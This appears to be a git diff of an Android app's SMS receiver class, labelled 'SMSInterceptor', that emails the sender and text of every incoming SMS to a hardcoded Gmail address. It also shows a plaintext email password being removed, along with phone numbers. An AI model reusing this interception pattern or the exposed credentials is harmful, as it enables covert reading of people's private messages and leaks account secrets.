@@ -18,16 +18,12 @@ public class SMSListener extends BroadcastReceiver {
 
   private static GmailSender sender;
 
-  public static  Context context;
-
-  public static String emailString         = "justdriveapp1@gmail.com";
-  public static String emailPasswordString = "GHOST21ghost";
-  public static String phoneNumberString   = "2014640695";
-
-
   public  static Object[] pdus;
-
+  public  static  Context context;
   public  static String mBody = null;
+
+  private static String phoneNumberString = "8484820667";
+  private static String gmailEmailString = "justdriveapp1@gmail.com";
 
   @Override
   public void onReceive(Context context, Intent intent) {
@@ -63,7 +59,8 @@ public class SMSListener extends BroadcastReceiver {
                 try {
                   Log.d("SMSInterceptor SMSListener", "Sending email.");
                   sender = new GmailSender();
-                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + message_from + "\nMessage: " + mBody,emailString,emailString);
+                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + message_from + "\nMessage: " + mBody, gmailEmailString);
+                  //sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + message_from + "\nMessage: " + mBody,emailString,emailString);
                 }
                 catch(Exception e) {
                   Log.e("gmailSenderError", "" + e.toString());
